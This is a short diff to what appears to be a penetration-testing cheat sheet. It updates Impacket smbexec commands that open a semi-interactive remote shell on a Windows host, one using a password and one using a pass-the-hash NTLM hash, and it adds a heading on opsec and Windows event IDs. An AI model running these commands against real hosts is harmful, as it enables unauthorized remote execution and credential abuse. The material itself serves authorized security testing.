@@ -2,10 +2,10 @@
 https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
 
 # get semi interactive powershell
-python smbexec.py <domain>/<user>:<password>@<rhost>
+impacket-smbexec <domain>/<user>:<password>@<rhost>
 
 # using hash
-python smbexec.py -hashes :<ntlmHash> <domain>/<user>@<rhost>
+impacket-smbexec -hashes :<ntlmHash> <domain>/<user>@<rhost>
  
 # opsec considerations
 # Windows Security Log Event IDs
